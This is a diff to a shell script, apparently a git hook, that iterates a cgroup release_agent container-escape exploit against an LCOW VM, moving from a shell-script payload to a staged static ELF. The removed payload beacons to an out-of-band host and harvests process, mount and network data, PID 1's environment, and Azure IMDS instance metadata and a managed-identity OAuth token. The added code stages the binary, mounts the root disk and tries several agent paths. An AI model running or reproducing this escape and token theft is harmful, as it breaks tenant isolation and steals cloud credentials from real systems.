@@ -219,22 +219,19 @@ report > "$WORKTREE/$OUT" 2>&1
 #   collector confirms execution even if the sdc write path fails.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
 {
-    echo "CGROUP_ESCAPE: === poc16 — correct mnt/ subpath + move-to-root trigger ==="
-    # Key discoveries from poc15:
-    #   1. MOUNT_POINT=/mount/gitrepo/mnt and PWD=/mount/gitrepo/mnt/test —
-    #      the ext4 volume root is /mount/gitrepo/ but the app container receives
-    #      a bind-mount of the /mnt/ subdirectory at /tmp/hooks/.
-    #   2. Writing to /mount/gitrepo/escape.sh (ext4 root) is NOT visible to
-    #      the app container or the init-ns agent path.  Must write to
-    #      /mount/gitrepo/mnt/escape.sh  (= init-ns: /run/mounts/scsi/m1/mnt/escape.sh).
-    #   3. Trigger flaw: sh -c "echo \$\$ > cgroup.procs" may run in the parent's
-    #      PID context (ash optimization), so the cgroup never truly empties.
-    #      Fix: move OUR OWN PID into esc$$ then move back to root → esc$$ empties.
-    #   4. The memory cgroup release_agent IS globally stored (visible in the app
-    #      container's /proc/mounts), so the path assignment works — only the
-    #      trigger or the file-path resolution was the problem.
+    echo "CGROUP_ESCAPE: === poc17 — static ELF release_agent (no /bin/sh needed) ==="
+    # Root cause identified from poc16:
+    #   - Trigger fires correctly (tasks 5→0 confirmed)
+    #   - /run/mounts/scsi/m1/mnt/escape.sh path is correct
+    #   - BUT call_usermodehelper requires an ELF or shebang binary that EXISTS in
+    #     the INIT NAMESPACE.  The LCOW rootfs (sda) has ONLY GCS tools in /bin/
+    #     (gcs, gcstools, vsockexec, wait-paths) — NO /bin/sh, NO busybox.
+    #   - #!/bin/sh shebang causes ENOENT at kernel execve → silent failure.
+    #   Fix: use a pre-compiled static ELF (escape_elf in the repo) as the agent.
+    #   The ELF writes output to /run/mounts/scsi/m1/mnt/ESCAPE_OUTPUT.txt and
+    #   sends an OOB HTTP beacon — no shell required.
 
-    # ── Parse overlay upperdir (for fallback path) ───────────────────
+    # ── Parse overlay upperdir ───────────────────────────────────────
     UPPERDIR=""
     while IFS= read -r _mline; do
         set -- $_mline; _mp="$5"; shift 6 2>/dev/null
@@ -245,61 +242,44 @@ if [ "$DO_CGROUP_FIRE" = "1" ]; then
         fi
     done < /proc/self/mountinfo
 
-    # ── Locate the gitRepo volume's mnt/ subdirectory ───────────────
+    # ── Locate the gitRepo volume mnt/ subdir ───────────────────────
     SDC_MNT=$(awk '$3=="8:32"{print $5; exit}' /proc/self/mountinfo 2>/dev/null)
     SDC_MNT_SUBDIR="${SDC_MNT}/mnt"
     echo "CGROUP_ESCAPE: sdc_mnt=$SDC_MNT  subdir=$SDC_MNT_SUBDIR  upperdir=$UPPERDIR"
 
-    # ── Write payload to the correct path ───────────────────────────
-    # Place it in the mnt/ subdirectory so the init-ns can access it at
-    # /run/mounts/scsi/m1/mnt/escape.sh AND the app container reads it
-    # at /tmp/hooks/escape.sh.
-    ESCAPE_SH="${SDC_MNT_SUBDIR}/escape.sh"
-    printf '#!/bin/sh\n' > "$ESCAPE_SH"
-    printf 'OOB_HOST="%s"\n' "$OOB_HOST" >> "$ESCAPE_SH"
-    cat >> "$ESCAPE_SH" << 'INITNS_PAYLOAD'
-# Runs in LCOW VM init namespace (call_usermodehelper).
-# Output to same directory → sidecar reads it via /mount/gitrepo/mnt/ESCAPE_OUTPUT.txt
-OUT="$(dirname "$0")/ESCAPE_OUTPUT.txt"
-wget -qT5 -O/dev/null "http://${OOB_HOST}/INITNS_ESCAPE?pid=$$&cgroup=$1" 2>/dev/null
-{
-echo "=== CGROUP ESCAPE: LCOW VM INIT NAMESPACE ==="
-echo "pid=$$ cgroup_arg=$1 date=$(date -u)"
-id; uname -a
-echo "--- /proc/self/mountinfo (init-ns view) ---"
-cat /proc/self/mountinfo 2>/dev/null | head -60
-echo "--- processes ---"; ps -ef 2>/dev/null
-echo "--- /proc/mounts ---"; cat /proc/mounts 2>/dev/null | head -60
-echo "--- network ---"; ip addr 2>/dev/null; ip route 2>/dev/null
-echo "--- /etc/hosts ---"; cat /etc/hosts 2>/dev/null
-echo "--- env pid1 ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
-echo "--- GCS log (tail 80) ---"; tail -80 /run/gcs/gcs.log 2>/dev/null || echo "not found"
-echo "--- /run/gcs/ layout ---"; find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -80
-echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null; ls -la /dev/vsock 2>/dev/null
-echo "--- IMDS instance ---"
-wget -qT5 --header="Metadata: true" \
-    -O- "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 8192
-echo "--- IMDS identity token ---"
-wget -qT5 --header="Metadata: true" \
-    -O- "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null | head -c 4096
-echo "--- wireserver ---"; wget -qT3 -O- "http://168.63.129.16/" 2>/dev/null | head -c 2048
-echo "=== DONE ==="
-} > "$OUT" 2>&1
-INITNS_PAYLOAD
-    chmod +x "$ESCAPE_SH"
-    echo "CGROUP_ESCAPE: payload written: $(ls -la $ESCAPE_SH 2>&1)"
-    cp "$ESCAPE_SH" /tmp/.escape.sh 2>/dev/null && chmod +x /tmp/.escape.sh
+    # ── Stage the ELF into the gitRepo volume ───────────────────────
+    # The ELF (customrepo/hooks/escape_elf) was cloned into the worktree.
+    # Copy it to the mnt/ subdir so the init namespace can reach it.
+    # Init-ns path will be /run/mounts/scsi/m1/mnt/escape_elf
+    HOOKDIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+    ESCAPE_ELF="${SDC_MNT_SUBDIR}/escape_elf"
+    cp "${HOOKDIR}/escape_elf" "$ESCAPE_ELF" 2>/dev/null && chmod +x "$ESCAPE_ELF"
+    echo "CGROUP_ESCAPE: ELF staged: $(ls -la $ESCAPE_ELF 2>&1)"
+    echo "CGROUP_ESCAPE: sda /usr/bin (check for sh/busybox):"
+    # Mount sda to check what shell exists in the init ns (diagnostic only)
+    mkdir -p /tmp/.mnt_sda_chk 2>/dev/null
+    mount -o ro /dev/sda /tmp/.mnt_sda_chk 2>/dev/null && {
+        ls /tmp/.mnt_sda_chk/usr/bin/ 2>&1 | head -20
+        ls /tmp/.mnt_sda_chk/usr/sbin/ 2>&1 | head -10
+        ls /tmp/.mnt_sda_chk/bin/ 2>&1 | head -10
+        # Try to run busybox sh directly as a sanity check (it runs in sidecar ns, not init ns)
+        /tmp/.mnt_sda_chk/bin/busybox sh -c 'echo busybox_sh_works' 2>&1 || echo "no busybox in /bin"
+        umount /tmp/.mnt_sda_chk 2>/dev/null
+    } || echo "  sda mount failed"
+    rmdir /tmp/.mnt_sda_chk 2>/dev/null
+    # Also copy ELF to overlay upperdir as a fallback
+    cp "$ESCAPE_ELF" /tmp/.escape_elf 2>/dev/null && chmod +x /tmp/.escape_elf
 
     # ── Attempt escape with corrected paths and trigger ──────────────
     CG_MNT=/tmp/.cge_$$
     mkdir -p "$CG_MNT" 2>/dev/null
 
     for AGENT_PATH in \
+        "/run/mounts/scsi/m1/mnt/escape_elf" \
         "/run/mounts/scsi/m1/mnt/escape.sh" \
-        "/run/mounts/scsi/m1/escape.sh" \
-        "/run/mounts/scsi/m0/mnt/escape.sh" \
-        "/run/mounts/scsi/m2/mnt/escape.sh" \
-        "${UPPERDIR}/tmp/.escape.sh"
+        "/run/mounts/scsi/m1/escape_elf" \
+        "/run/mounts/scsi/m2/mnt/escape_elf" \
+        "${UPPERDIR}/tmp/.escape_elf"
     do
         [ -z "$AGENT_PATH" ] && continue
         echo "CGROUP_ESCAPE: trying $AGENT_PATH"
@@ -336,6 +316,7 @@ INITNS_PAYLOAD
 
         # Consolidate output
         for _op in "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" \
+                   "${SDC_MNT:-/mount/gitrepo}/mnt/ESCAPE_OUTPUT.txt" \
                    "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" \
                    "$WORKTREE/ESCAPE_OUTPUT.txt"; do
             [ -f "$_op" ] && cp "$_op" "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null && break
@@ -353,7 +334,7 @@ INITNS_PAYLOAD
     # ── Post-mortem if all attempts failed ───────────────────────────
     if [ ! -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
         echo "CGROUP_ESCAPE: all paths failed — collecting diagnostics"
-        echo "  escape.sh: $(ls -la $ESCAPE_SH 2>&1)"
+        echo "  escape_elf: $(ls -la $ESCAPE_ELF 2>&1)"
         echo "  mnt subdir contents: $(ls -la ${SDC_MNT_SUBDIR}/ 2>&1 | head -5)"
         # Read kernel log for usermodehelper errors
         echo "--- /dev/kmsg (last 40 entries, for call_usermodehelper errors) ---"
